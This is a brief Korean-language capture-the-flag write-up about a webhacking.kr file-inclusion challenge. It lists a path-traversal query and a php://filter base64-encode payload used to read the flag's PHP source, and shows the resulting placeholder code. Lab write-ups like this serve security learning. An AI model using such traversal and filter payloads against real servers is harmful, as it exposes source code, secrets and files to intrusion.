http://webhacking.kr:10001/?file==../../flag
다른 거에는 아무 반응도 없더니 위에 입력값에는 
FLAG is in the code 이런 반응을 보였다 

php://filter/convert.base64-encode/resource=flag
?? 내가 php-1에서 봤던 php 명령어가 그대로 사용된다 
이게 file vulnerability이라고 생각했는데 
이 명령어가 그대로 사용될 줄은 상상도 못했다 

<?php
  echo "FLAG is in the code";
  $flag = "FLAG{this...}";
?>

역시 이 다음 부분은 php-1과 완전히 같았다 
사실 그렇게 치면 php-1이 이 문제를 오마주한 것일 지도 모르겠다 
리눅스 화면이 맨 처음에 등장하는 상태에서 php 명령어가 그대로 적용되었다
